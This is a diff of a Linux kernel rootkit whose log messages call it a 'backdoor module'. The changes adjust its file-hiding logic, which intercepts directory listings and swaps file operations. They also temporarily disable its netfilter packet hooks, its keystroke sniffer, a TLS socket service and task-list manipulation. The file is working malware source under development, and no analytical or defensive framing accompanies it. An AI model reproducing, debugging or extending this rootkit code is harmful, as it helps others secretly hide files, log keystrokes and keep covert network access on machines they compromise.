@@ -596,11 +596,13 @@ static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len,
         }
     }
     for (i = 0; i < hidden_file_count; ++i) {
-        printk(KERN_ALERT "Checking %s\n", hidden_files[i]);
+        printk(KERN_ALERT "Checking %s against %s\n", proc_name, hidden_files[i]);
+#if 0
         if (strncmp(proc_name, hidden_files[i], strlen(hidden_files[i])) == 0) {
             printk(KERN_ALERT "Found my hidden file\n");
             return 0;
         }
+#endif
     }
     return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
 }
@@ -680,10 +682,11 @@ static int __init mod_init(void) {
     }
 
     memset(parent_name, 0, PATH_MAX);
-    char *path_name = dentry_path_raw(my_file_path.dentry->d_parent, parent_name, PATH_MAX);
+    //char *path_name = dentry_path_raw(my_file_path.dentry->d_parent, parent_name, PATH_MAX);
+    char *path_name = dentry_path_raw(my_file_path.dentry, parent_name, PATH_MAX);
 
     //strcpy(hidden_files[hidden_file_count++], "/aing-matrix");
-    strcpy(hidden_files[hidden_file_count++], parent_name);
+    strcpy(hidden_files[hidden_file_count++], path_name);
 
     //my_file_inode = my_file_path.dentry->d_inode;
     my_file_inode = my_file_path.dentry->d_parent->d_inode;
@@ -693,6 +696,7 @@ static int __init mod_init(void) {
     file_ops.iterate_shared = rk_iterate_shared;
     my_file_inode->i_fop = &file_ops;
 
+#if 0
     nfhi.hook = incoming_hook;
     nfhi.hooknum = NF_INET_LOCAL_IN;
     nfhi.pf = PF_INET;
@@ -728,6 +732,7 @@ static int __init mod_init(void) {
     printk(KERN_ALERT "backdoor module loaded\n");
 
     register_keyboard_notifier(&keysniffer_blk);
+#endif
     return 0;
 }
 
@@ -748,10 +753,10 @@ static void __exit mod_exit(void) {
     int i;
     struct task_struct* ts;
 
-    nf_unregister_net_hook(&init_net, &nfho);
-    nf_unregister_net_hook(&init_net, &nfhi);
+    //nf_unregister_net_hook(&init_net, &nfho);
+    //nf_unregister_net_hook(&init_net, &nfhi);
 
-    unregister_keyboard_notifier(&keysniffer_blk);
+    //unregister_keyboard_notifier(&keysniffer_blk);
 
     proc_inode = proc_path.dentry->d_inode;
     proc_inode->i_fop = backup_proc_fops;
@@ -759,6 +764,7 @@ static void __exit mod_exit(void) {
     my_file_inode = my_file_path.dentry->d_inode;
     my_file_inode->i_fop = backup_file_ops;
 
+#if 0
     if (svc) {
         if (svc->tls_socket) {
             sock_release(svc->tls_socket);
@@ -797,6 +803,7 @@ static void __exit mod_exit(void) {
         }
     }
     write_unlock(my_tasklist_lock);
+#endif
 #endif
     printk(KERN_ALERT "removed backdoor module\n");
 }
